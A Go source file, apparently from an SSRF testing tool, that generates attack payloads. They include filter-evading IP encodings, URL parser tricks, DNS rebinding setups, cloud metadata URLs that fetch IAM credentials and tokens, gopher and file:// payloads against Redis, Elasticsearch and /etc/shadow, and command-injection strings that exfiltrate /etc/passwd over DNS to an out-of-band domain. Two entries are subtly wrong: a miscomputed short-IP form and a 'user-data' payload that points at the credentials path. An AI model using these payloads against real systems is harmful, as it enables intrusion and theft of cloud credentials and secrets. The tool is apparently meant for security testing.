package handlers

import (
	"encoding/json"
	"fmt"
	"net"
	"strings"

	"github.com/google/uuid"
)

// PayloadResult contains generated payloads with descriptions.
type PayloadResult struct {
	UUID        string            `json:"uuid"`
	Type        string            `json:"type"`
	Payloads    []PayloadEntry    `json:"payloads"`
	RebindSetup map[string]string `json:"rebind_setup,omitempty"`
}

type PayloadEntry struct {
	Payload     string `json:"payload"`
	Description string `json:"description"`
	Technique   string `json:"technique"`
}

// GeneratePayloads is the main dispatch for payload generation.
func GeneratePayloads(ptype string, rawParams json.RawMessage) (*PayloadResult, error) {
	id := uuid.New().String()[:8]
	result := &PayloadResult{UUID: id, Type: ptype}

	var params map[string]string
	if len(rawParams) > 0 {
		_ = json.Unmarshal(rawParams, &params)
	}
	if params == nil {
		params = map[string]string{}
	}

	domain := params["domain"]
	if domain == "" {
		domain = "oob.example.com"
	}

	switch ptype {
	case "ssrf", "oob":
		result.Payloads = generateOOBPayloads(id, domain)
	case "bypass", "ip-bypass":
		target := params["target"]
		if target == "" {
			target = "127.0.0.1"
		}
		result.Payloads = generateIPBypassPayloads(target, id, domain)
	case "rebind":
		publicIP := params["public_ip"]
		privateIP := params["private_ip"]
		if publicIP == "" {
			publicIP = "1.1.1.1"
		}
		if privateIP == "" {
			privateIP = "169.254.169.254"
		}
		result.Payloads, result.RebindSetup = generateRebindPayloads(id, domain, publicIP, privateIP)
	case "cloud":
		result.Payloads = generateCloudMetadataPayloads(id, domain)
	case "protocol":
		result.Payloads = generateProtocolPayloads(id, domain)
	case "exfil":
		result.Payloads = generateExfilPayloads(id, domain)
	case "headers", "header-injection":
		result.Payloads = generateHeaderInjectionPayloads(id, domain)
	case "imdsv2":
		result.Payloads = generateIMDSv2Payloads(id, domain)
	default:
		// Return all types
		result.Payloads = append(result.Payloads, generateOOBPayloads(id, domain)...)
		result.Payloads = append(result.Payloads, generateIPBypassPayloads("127.0.0.1", id, domain)...)
		result.Payloads = append(result.Payloads, generateCloudMetadataPayloads(id, domain)...)
		result.Payloads = append(result.Payloads, generateProtocolPayloads(id, domain)...)
		result.Payloads = append(result.Payloads, generateHeaderInjectionPayloads(id, domain)...)
		result.Payloads = append(result.Payloads, generateIMDSv2Payloads(id, domain)...)
	}

	return result, nil
}

func generateOOBPayloads(id, domain string) []PayloadEntry {
	base := fmt.Sprintf("http://%s.%s", id, domain)
	return []PayloadEntry{
		{
			Payload:     base,
			Description: "Callback OOB básico — detecta SSRF ciego vía DNS+HTTP",
			Technique:   "oob-basic",
		},
		{
			Payload:     fmt.Sprintf("https://%s.%s", id, domain),
			Description: "Callback OOB HTTPS — útil cuando target exige TLS",
			Technique:   "oob-https",
		},
		{
			Payload:     fmt.Sprintf("http://%s.%s/ssrf-check", id, domain),
			Description: "Callback con path — diferencia DNS-only de HTTP completo",
			Technique:   "oob-path",
		},
		{
			Payload:     fmt.Sprintf("//%s.%s/test", id, domain),
			Description: "Schema-relative URL — heredará http/https del contexto",
			Technique:   "oob-schema-relative",
		},
	}
}

// generateIPBypassPayloads genera variantes ofuscadas de una IP para evadir filtros.
func generateIPBypassPayloads(targetIP, id, domain string) []PayloadEntry {
	ip := net.ParseIP(targetIP)
	if ip == nil {
		return nil
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil
	}

	a, b, c, d := int(ip4[0]), int(ip4[1]), int(ip4[2]), int(ip4[3])
	decimal := a<<24 | b<<16 | c<<8 | d
	hexIP := fmt.Sprintf("0x%02x%02x%02x%02x", a, b, c, d)
	octal := fmt.Sprintf("0%o.0%o.0%o.0%o", a, b, c, d)
	dotlessHex := fmt.Sprintf("0x%02x.0x%02x.0x%02x.0x%02x", a, b, c, d)

	note := fmt.Sprintf("(equivalente a %s)", targetIP)

	entries := []PayloadEntry{
		{
			Payload:     fmt.Sprintf("http://%d/", decimal),
			Description: "IP en decimal sin puntos " + note,
			Technique:   "ip-decimal",
		},
		{
			Payload:     fmt.Sprintf("http://%s/", hexIP),
			Description: "IP en hexadecimal " + note,
			Technique:   "ip-hex",
		},
		{
			Payload:     fmt.Sprintf("http://%s/", octal),
			Description: "IP en octal " + note,
			Technique:   "ip-octal",
		},
		{
			Payload:     fmt.Sprintf("http://%s/", dotlessHex),
			Description: "IP en hex con puntos " + note,
			Technique:   "ip-hex-dotted",
		},
	}

	// Leading-zeros bypass
	entries = append(entries,
		PayloadEntry{
			Payload:     fmt.Sprintf("http://0%d.0%d.0%d.0%d/", a, b, c, d),
			Description: "Leading zeros en cada octeto — algunos parsers los ignoran " + note,
			Technique:   "ip-leading-zeros",
		},
		PayloadEntry{
			Payload:     fmt.Sprintf("http://%03d.%03d.%03d.%03d/", a, b, c, d),
			Description: "Octetos con 3 dígitos — zero-padded " + note,
			Technique:   "ip-leading-zeros-3",
		},
	)

	// URL scheme case sensitivity bypass
	entries = append(entries,
		PayloadEntry{
			Payload:     fmt.Sprintf("HTTP://%s/", targetIP),
			Description: "Scheme uppercase — algunos filtros son case-sensitive",
			Technique:   "scheme-uppercase",
		},
		PayloadEntry{
			Payload:     fmt.Sprintf("hTTp://%s/", targetIP),
			Description: "Scheme mixed-case — bypass de filtros con comparación exacta",
			Technique:   "scheme-mixedcase",
		},
	)

	// IPv6 variants (solo para 127.0.0.1)
	if targetIP == "127.0.0.1" {
		entries = append(entries,
			PayloadEntry{
				Payload:     "http://[::1]/",
				Description: "IPv6 loopback compacto",
				Technique:   "ip-ipv6-compact",
			},
			PayloadEntry{
				Payload:     "http://[0000:0000:0000:0000:0000:0000:0000:0001]/",
				Description: "IPv6 loopback expandido",
				Technique:   "ip-ipv6-full",
			},
			PayloadEntry{
				Payload:     "http://[::ffff:127.0.0.1]/",
				Description: "IPv4-mapped IPv6",
				Technique:   "ip-ipv4mapped",
			},
			PayloadEntry{
				Payload:     "http://[fe80::1%25eth0]/",
				Description: "IPv6 Zone ID — algunos parsers ignoran o truncan el zone identifier",
				Technique:   "ip-ipv6-zone",
			},
			PayloadEntry{
				Payload:     "http://127.1/",
				Description: "IP corta (browser-style shorthand)",
				Technique:   "ip-short",
			},
			PayloadEntry{
				Payload:     "http://0/",
				Description: "IP cero (equivalente a 0.0.0.0/localhost en muchos OS)",
				Technique:   "ip-zero",
			},
		)
	}

	// URL parser differentials
	entries = append(entries,
		PayloadEntry{
			Payload:     fmt.Sprintf("http://evil.%s.%s@%s/", id, domain, targetIP),
			Description: "Userinfo trick — el parser de la app ve evil.com, la lib HTTP va a " + targetIP,
			Technique:   "parser-differential-userinfo",
		},
		PayloadEntry{
			Payload:     fmt.Sprintf("http://%s#@evil.%s.%s/", targetIP, id, domain),
			Description: "Fragment trick — target ve evil.com, parser real va a " + targetIP,
			Technique:   "parser-differential-fragment",
		},
		PayloadEntry{
			Payload:     fmt.Sprintf("http://expected-host:80@%s:8080/", targetIP),
			Description: "Port trick — combina host válido con IP interna",
			Technique:   "parser-differential-port",
		},
	)

	return entries
}

func generateRebindPayloads(id, domain, publicIP, privateIP string) ([]PayloadEntry, map[string]string) {
	rebindDomain := fmt.Sprintf("rebind-%s.%s", id, domain)
	return []PayloadEntry{
		{
			Payload:     fmt.Sprintf("http://%s/", rebindDomain),
			Description: fmt.Sprintf("DNS rebinding: 1ª resolución→%s (bypassa whitelist), 2ª→%s (explotación)", publicIP, privateIP),
			Technique:   "dns-rebinding",
		},
		{
			Payload:     fmt.Sprintf("http://%s/aws-metadata/latest/meta-data/iam/security-credentials/", rebindDomain),
			Description: "Rebinding directo a metadata AWS (169.254.169.254)",
			Technique:   "dns-rebinding-aws",
		},
	}, map[string]string{
		"api_call":     fmt.Sprintf(`POST /api/rebind {"uuid":"%s","public_ip":"%s","private_ip":"%s","switch_after":1}`, id, publicIP, privateIP),
		"rebind_fqdn":  rebindDomain,
		"public_ip":    publicIP,
		"private_ip":   privateIP,
		"how_it_works": "Primera consulta DNS devuelve public_ip (pasa la validación del servidor). Consultas posteriores devuelven private_ip. TTL=1 fuerza re-resolución inmediata.",
	}
}

func generateCloudMetadataPayloads(id, domain string) []PayloadEntry {
	return []PayloadEntry{
		// AWS IMDSv1
		{Payload: "http://169.254.169.254/latest/meta-data/", Description: "AWS IMDSv1 — root metadata", Technique: "cloud-aws-imds"},
		{Payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", Description: "AWS IMDSv1 — IAM credentials listing", Technique: "cloud-aws-creds"},
		{Payload: "http://169.254.169.254/latest/user-data", Description: "AWS IMDSv1 — user-data (puede contener secrets)", Technique: "cloud-aws-userdata"},
		{Payload: "http://169.254.169.254/latest/meta-data/hostname", Description: "AWS IMDSv1 — hostname interno", Technique: "cloud-aws-hostname"},
		// AWS IMDSv2 (requiere token)
		{Payload: "http://169.254.169.254/latest/api/token", Description: "AWS IMDSv2 — obtener token (PUT con TTL header)", Technique: "cloud-aws-imdsv2"},
		// GCP
		{Payload: "http://metadata.google.internal/computeMetadata/v1/", Description: "GCP metadata root (requiere Metadata-Flavor: Google header)", Technique: "cloud-gcp"},
		{Payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", Description: "GCP — service account token", Technique: "cloud-gcp-token"},
		{Payload: "http://169.254.169.254/computeMetadata/v1/instance/", Description: "GCP metadata vía IP", Technique: "cloud-gcp-ip"},
		// Azure
		{Payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Description: "Azure IMDS — instance info (requiere Metadata:true header)", Technique: "cloud-azure"},
		{Payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/", Description: "Azure IMDS — managed identity token", Technique: "cloud-azure-token"},
		// DigitalOcean
		{Payload: "http://169.254.169.254/metadata/v1/", Description: "DigitalOcean metadata root", Technique: "cloud-do"},
		// Kubernetes
		{Payload: "https://kubernetes.default.svc/api/v1/", Description: "Kubernetes API server interno", Technique: "cloud-k8s"},
		{Payload: "http://10.96.0.1/api/v1/namespaces/default/secrets", Description: "K8s — listar secrets namespace default", Technique: "cloud-k8s-secrets"},
		// Callback para confirmar alcance via nuestro servidor
		{
			Payload:     fmt.Sprintf("http://%s.%s/confirm-metadata-access", id, domain),
			Description: "Confirmar alcance a IPs internas vía nuestro servidor OOB",
			Technique:   "cloud-oob-confirm",
		},
	}
}

func generateProtocolPayloads(id, domain string) []PayloadEntry {
	return []PayloadEntry{
		// File protocol
		{Payload: "file:///etc/passwd", Description: "Lectura de /etc/passwd vía file://", Technique: "protocol-file"},
		{Payload: "file:///etc/shadow", Description: "Lectura de /etc/shadow (requiere root)", Technique: "protocol-file"},
		{Payload: "file:///proc/self/environ", Description: "Variables de entorno del proceso (secretos en env)", Technique: "protocol-file-proc"},
		{Payload: "file:///proc/net/tcp", Description: "Conexiones TCP activas (descubrir servicios internos)", Technique: "protocol-file-net"},
		// Dict protocol (Redis, memcached)
		{Payload: "dict://127.0.0.1:6379/info", Description: "Redis INFO vía dict:// — confirma Redis expuesto", Technique: "protocol-dict-redis"},
		{Payload: "dict://127.0.0.1:11211/stats", Description: "Memcached stats vía dict://", Technique: "protocol-dict-memcached"},
		// Gopher (SSRF con control de payload raw)
		{Payload: "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aKEYS%0d%0a", Description: "Redis KEYS * vía gopher:// (listar todas las keys)", Technique: "protocol-gopher-redis"},
		{Payload: "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0ahello%0d%0a$5%0d%0aworld%0d%0a", Description: "Redis SET vía gopher://", Technique: "protocol-gopher-redis-set"},
		{Payload: "gopher://127.0.0.1:9200/_GET+/_cat/indices+HTTP/1.0%0d%0a%0d%0a", Description: "Elasticsearch listar índices vía gopher://", Technique: "protocol-gopher-es"},
		// SFTP/FTP
		{Payload: "ftp://127.0.0.1:21/", Description: "FTP local — confirmar servidor FTP", Technique: "protocol-ftp"},
		{Payload: "sftp://127.0.0.1:22/etc/passwd", Description: "SFTP — intento de lectura de archivos", Technique: "protocol-sftp"},
		// LDAP
		{Payload: "ldap://127.0.0.1:389/", Description: "LDAP scan — confirmar servicio LDAP", Technique: "protocol-ldap"},
		// SMTP
		{Payload: "smtp://127.0.0.1:25/", Description: "SMTP internal scan", Technique: "protocol-smtp"},
		// Jar (Java-specific)
		{Payload: fmt.Sprintf("jar:http://%s.%s/!/WEB-INF/web.xml", id, domain), Description: "Java JAR protocol — extrae archivos de JARs remotos", Technique: "protocol-jar"},
	}
}

func generateExfilPayloads(id, domain string) []PayloadEntry {
	return []PayloadEntry{
		{
			Payload:     fmt.Sprintf("http://$(whoami).%s.%s/", id, domain),
			Description: "Command injection + SSRF: exfiltra salida de whoami vía DNS",
			Technique:   "exfil-cmd-injection",
		},
		{
			Payload:     fmt.Sprintf("http://`id`.%s.%s/", id, domain),
			Description: "Backtick command injection + SSRF exfiltration",
			Technique:   "exfil-backtick",
		},
		{
			Payload:     fmt.Sprintf("http://%s.%s/$(cat /etc/hostname)", id, domain),
			Description: "Exfiltrar hostname vía path del request HTTP",
			Technique:   "exfil-http-path",
		},
		{
			Payload:     "nslookup $(cat /etc/passwd|base64|head -c 50)." + id + "." + domain,
			Description: "nslookup + base64 para exfiltrar /etc/passwd en chunks DNS",
			Technique:   "exfil-dns-chunk",
		},
	}
}

// generateHeaderInjectionPayloads returns OOB callbacks labelled by the injection header.
func generateHeaderInjectionPayloads(id, domain string) []PayloadEntry {
	target := fmt.Sprintf("http://%s.%s/header-ssrf", id, domain)
	hostOnly := fmt.Sprintf("%s.%s", id, domain)
	return []PayloadEntry{
		{
			Payload:     target,
			Description: "Inyectar en X-Forwarded-For — proxies y backends suelen usarlo para routing",
			Technique:   "header-xff",
		},
		{
			Payload:     target,
			Description: "Inyectar en X-Original-URL — sobrescribe la URL en algunos proxies (nginx, traefik)",
			Technique:   "header-original-url",
		},
		{
			Payload:     target,
			Description: "Inyectar en X-Rewrite-URL — IIS y algunos reverse proxies reescriben con este header",
			Technique:   "header-rewrite-url",
		},
		{
			Payload:     target,
			Description: "Inyectar en Referer — backends que hacen fetch de la URL del Referer (social previews, etc.)",
			Technique:   "header-referer",
		},
		{
			Payload:     hostOnly,
			Description: "Inyectar en Host — cambia el routing del backend si no valida el Host header",
			Technique:   "header-host",
		},
		{
			Payload:     target,
			Description: "Inyectar en X-Forwarded-Host — CDNs y balanceadores lo usan para reconstruir URLs",
			Technique:   "header-fwd-host",
		},
	}
}

// generateIMDSv2Payloads returns the two-step AWS IMDSv2 flow with explicit instructions.
func generateIMDSv2Payloads(id, domain string) []PayloadEntry {
	oobConfirm := fmt.Sprintf("http://%s.%s/imdsv2-confirm", id, domain)
	return []PayloadEntry{
		{
			Payload:     "http://169.254.169.254/latest/api/token",
			Description: "IMDSv2 paso 1 — PUT con header 'X-aws-ec2-metadata-token-ttl-seconds: 21600' para obtener token",
			Technique:   "cloud-aws-imdsv2-step1",
		},
		{
			Payload:     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			Description: "IMDSv2 paso 2 — GET con header 'X-aws-ec2-metadata-token: <token_del_paso_1>'",
			Technique:   "cloud-aws-imdsv2-step2",
		},
		{
			Payload:     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			Description: "IMDSv2 paso 2 — user-data (puede contener scripts con credenciales hardcoded)",
			Technique:   "cloud-aws-imdsv2-userdata",
		},
		{
			Payload:     oobConfirm,
			Description: "Confirmar acceso a IMDS vía nuestro servidor OOB (útil si el target hace fetch del token y luego callback)",
			Technique:   "cloud-aws-imdsv2-oob",
		},
	}
}

// IPVariants devuelve todas las representaciones de una IP (helper para el frontend).
func IPVariants(targetIP string) map[string]string {
	ip := net.ParseIP(targetIP)
	if ip == nil {
		return nil
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil
	}

	a, b, c, d := int(ip4[0]), int(ip4[1]), int(ip4[2]), int(ip4[3])
	decimal := a<<24 | b<<16 | c<<8 | d
	parts := []string{
		fmt.Sprintf("0%o", a), fmt.Sprintf("0%o", b),
		fmt.Sprintf("0%o", c), fmt.Sprintf("0%o", d),
	}

	return map[string]string{
		"original": targetIP,
		"decimal":  fmt.Sprintf("%d", decimal),
		"hex":      fmt.Sprintf("0x%02x%02x%02x%02x", a, b, c, d),
		"octal":    strings.Join(parts, "."),
		"ipv6":     fmt.Sprintf("[::ffff:%s]", targetIP),
		"short":    fmt.Sprintf("%d.%d", a, b<<8|c<<8|d),
	}
}
